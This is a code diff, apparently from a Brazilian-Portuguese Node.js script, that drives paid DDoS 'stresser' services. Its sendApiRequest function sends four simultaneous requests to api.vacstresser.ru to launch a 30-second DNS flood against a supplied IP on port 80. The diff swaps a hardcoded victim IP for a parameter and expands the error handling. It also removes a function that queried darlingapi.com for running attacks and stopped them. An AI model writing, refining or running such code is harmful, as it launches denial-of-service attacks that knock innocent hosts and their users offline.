@@ -54,28 +54,30 @@ async function clear() {
 }
 
 async function sendApiRequest(ip) {
-    const url = `https://api.vacstresser.ru/api?key=${token}&host=191.13.20.96&port=80&method=DNS&time=30`;
+    const url = `https://api.vacstresser.ru/api?key=${token}&host=${ip}&port=80&method=DNS&time=30`;
     const requests = Array(4).fill(url).map(u => axios.get(u));
+    
     try {
         await axios.all(requests);
         console.log(`Requisição enviada para o IP: ${ip}`);
     } catch (error) {
-        console.error(`Erro ao enviar requisição para o IP: ${ip}`, error.message);
-    }
-}
-
-async function verificar() {
-    try {
-        const response = await axios.get(`https://darlingapi.com/status?token=${token}`);
-        const data = response.data;
-
-        if (data.account.running > 0) {
-            const url = `https://darlingapi.com/stop_all?token=${token}`;
-            await axios.get(url);
-            console.log('Ataques anteriores interrompidos');
+        // Verifica se há uma resposta de erro
+        if (error.response) {
+            // O erro tem uma resposta com dados
+            const status = error.response.data.status;
+            const errorMessage = error.response.data.message || 'Mensagem de erro não disponível';
+            if (status === 'error') {
+                console.error(`Erro ao enviar requisição para o IP: ${ip}. Mensagem: ${errorMessage}`);
+            } else {
+                console.log(`Resposta da API para o IP: ${ip}. Status: ${status}`);
+            }
+        } else if (error.request) {
+            // A requisição foi feita, mas não houve resposta
+            console.error(`Erro ao enviar requisição para o IP: ${ip}. Sem resposta da API.`);
+        } else {
+            // Erro ao configurar a requisição
+            console.error(`Erro ao configurar a requisição para o IP: ${ip}. Mensagem: ${error.message}`);
         }
-    } catch (error) {
-        console.error('Erro ao verificar o status dos ataques:', error);
     }
 }
 
